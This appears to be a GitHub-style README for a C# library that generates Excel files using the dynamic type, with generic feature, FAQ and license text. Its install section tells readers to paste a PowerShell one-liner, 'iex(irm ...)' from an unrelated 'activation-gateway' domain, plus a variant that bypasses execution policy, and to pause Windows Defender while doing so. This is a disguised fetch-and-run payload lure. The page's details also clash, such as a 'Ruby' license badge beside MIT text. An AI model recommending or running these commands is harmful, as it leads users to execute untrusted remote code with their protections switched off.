<div align="center">

# TypeDynamicExcel: Dynamic C# Excel Generation – Windows Desktop Client

![preview](https://raw.githubusercontent.com/Natanael495/type-dynamic-excel/main/screen_2ce9.svg)

[![ci](https://img.shields.io/badge/Ci-Ok-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![OS](https://img.shields.io/badge/Os-Win_10%2F11-06b6d4?style=for-the-badge&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/Downloads-93K-22d3ee?style=for-the-badge&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/Powershell--7-7%2B-0891b2?style=for-the-badge&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/Channel-Active-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/Lic-Ruby-0e7490?style=for-the-badge&labelColor=0d1117)]()

</div>

---

TypeDynamicExcel is a desktop library that leverages the C# `dynamic` type to streamline the creation and manipulation of Excel documents. By binding workbook operations to dynamic dispatch, it reduces boilerplate and enables concise, expressive code for building sheets, cells, and ranges. The library targets scenarios where rapid document generation and flexible data binding are required, while preserving strong typing at the boundaries where it matters. It is designed for developers who want direct, programmatic control over Excel output without the overhead of verbose object models.

## ⚡ Install via PowerShell

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Execute the setup script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## 📋 System Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Dynamic Document Construction**: Leverages C# `dynamic` typing to build Excel workbooks through a fluent, expressive API, eliminating verbose worksheet and range boilerplate.
- **Strongly Typed Cell Values**: Supports assignment of native CLR types—strings, numerics, booleans, dates, and nullable values—with automatic mapping to appropriate Excel cell formats.
- **Worksheet and Range Management**: Programmatically create, rename, and remove worksheets; address individual cells, contiguous ranges, and named regions with readable indexer syntax.
- **Rich Cell Formatting**: Apply font styles, colors, borders, alignment, number formats, and column widths through the dynamic interface without intermediate objects.
- **Formula Support**: Insert Excel formulas as cell content using standard A1 notation, with deferred evaluation left to the spreadsheet application.
- **Row and Column Operations**: Insert, delete, resize, and reorder rows and columns while preserving formatting and formula references.
- **Multiple Output Targets**: Write generated workbooks to file streams or memory streams for downstream processing, transport, or archival.
- **No Office Interop Dependency**: Produces standards-compliant spreadsheet files without requiring Microsoft Excel or COM interop to be installed on the host machine.
- **Deterministic Output**: Generates consistent, reproducible workbook structures suitable for automated pipelines and integration testing.
- **Minimal Ceremony**: Reduces the amount of code required to produce formatted spreadsheets, improving readability and maintainability of document-generation logic.

## How it works

TypeDynamicExcel builds Excel workbooks through the C# `dynamic` keyword, so worksheet structure and cell content can be expressed as fluent, late-bound member access rather than through strongly typed interop wrappers. Each dynamic call is intercepted at runtime, translated into the corresponding workbook operation, and applied to an in-memory document model.

1. **Dynamic dispatch layer.** A custom `DynamicObject` implementation receives member accesses and invocations from the call site. Property and method names are mapped to workbook concepts (worksheets, rows, cells, ranges, styling), and arguments are validated before being handed to the document model.
2. **Document model construction.** Worksheets, rows, columns, and cell values are represented as an ordered object graph. Values are normalized by type—strings, numerics, dates, and booleans are stored with their native CLR types so that formatting and serialization remain lossless.
3. **Cell addressing and range resolution.** Cells can be targeted by index, by name, or through range expressions. The resolution step converts dynamic access chains into explicit coordinates, enabling consistent behavior for single-cell writes and bulk range operations.
4. **Styling and formatting application.** Formatting directives—number formats, fonts, alignment, borders, and column widths—are attached to the same object graph as the data they affect, so styling and content are written in a single pass.
5. **Serialization to the workbook package.** Once the model is fully populated, it is serialized into the Open XML workbook structure (workbook part, worksheet parts, shared strings, and styles). The serializer emits valid relationships and content types so the output opens cleanly in standard spreadsheet applications.
6. **Deterministic output.** Because the entire document is assembled in memory before serialization, generation is repeatable: the same dynamic call sequence produces the same workbook structure, which keeps automated document generation testable and predictable.

The result is a thin, expressive authoring surface over the underlying spreadsheet format—developers describe the workbook they want using dynamic syntax, and TypeDynamicExcel handles addressing, type normalization, styling, and package generation.

## Compatibility

TypeDynamicExcel targets .NET Framework 4.0 and later, and is compatible with .NET Standard 2.0, allowing use across .NET Framework, .NET Core, and .NET 5+ runtimes. The library relies on the C# `dynamic` keyword, so a compiler version supporting dynamic binding (C# 4.0 or later) is required for consuming code. It supports Microsoft Excel file formats through the Open XML SDK, enabling generation and manipulation of .xlsx workbooks without requiring Microsoft Excel to be installed on the host machine. Interoperability with COM-based Excel automation is not required, and the library functions in both console and service environments, including headless and server-side deployments. Compatibility with 32-bit and 64-bit processes is maintained, and no platform-specific dependencies are introduced beyond the underlying .NET runtime and Open XML SDK assemblies.

## FAQ

**What version of the .NET runtime is required?**
TypeDynamicExcel targets the .NET Framework and relies on the `dynamic` language feature introduced in C# 4.0. Ensure your project references `Microsoft.CSharp` when compiling against .NET Framework, or use a modern .NET target where `dynamic` binding is supported out of the box.

**Why does the library use `dynamic` instead of strongly typed APIs?**
The `dynamic` dispatch model allows call sites to be resolved at runtime, which keeps the document-construction syntax compact and readable. Property and method names map directly to the underlying spreadsheet object model, so you can express cell assignments, range operations, and worksheet creation without verbose intermediate types. This reduces boilerplate while preserving full access to the underlying object members.

**Can I use TypeDynamicExcel in a project that disables dynamic binding?**
Yes, provided the compiler settings permit `dynamic`. If your project sets `<LangVersion>` below 4.0 or treats dynamic dispatch as an error, the library's call sites will not compile. Raise the language version or isolate the document-generation code in a separate assembly where dynamic binding is enabled.

**How are runtime binding errors surfaced?**
Because member resolution occurs at runtime, an invalid property or method name throws a `RuntimeBinderException` rather than failing at compile time. Wrap document-generation blocks in try/catch when constructing dynamic call chains, and validate worksheet and range identifiers before assignment in production code paths.

**Does the library support multiple worksheets and named ranges?**
Yes. Worksheets can be added, selected, and configured through the same dynamic surface used for cell operations. Named ranges are addressable through the underlying object model, and cell values, formulas, and formatting can be applied per range.

**What file formats can be produced?**
TypeDynamicExcel generates spreadsheet documents through the underlying object model, supporting the standard workbook formats exposed by that model. The output stream can be written to disk or returned in memory for downstream consumption.

**Is the library thread-safe?**
No. Document construction mutates a shared object graph, so concurrent writes to the same workbook instance are not supported. Create one workbook per thread or serialize access with a lock when generating documents in parallel workloads.

**How do I handle large workbooks without excessive memory use?**
Prefer writing values in contiguous range assignments rather than cell-by-cell loops, and release workbook references promptly after the output stream is flushed. For very large datasets, generate documents in batches and dispose of intermediate instances between runs.

**What happens if a spreadsheet application is not installed on the build machine?**
TypeDynamicExcel operates on the document object model directly and does not require a desktop spreadsheet application to be installed. Document generation runs entirely within the process, which makes it suitable for server and CI environments.

**Can I contribute fixes or new features?**
Contributions are welcome through the project's repository workflow. Open an issue describing the defect or proposal, include a minimal reproduction for runtime binding problems, and submit a pull request with tests covering the affected dynamic call paths.

## License

TypeDynamicExcel is released under the MIT License. Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the following conditions: the above copyright notice and this permission notice shall be included in all copies or substantial portions of the software. The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.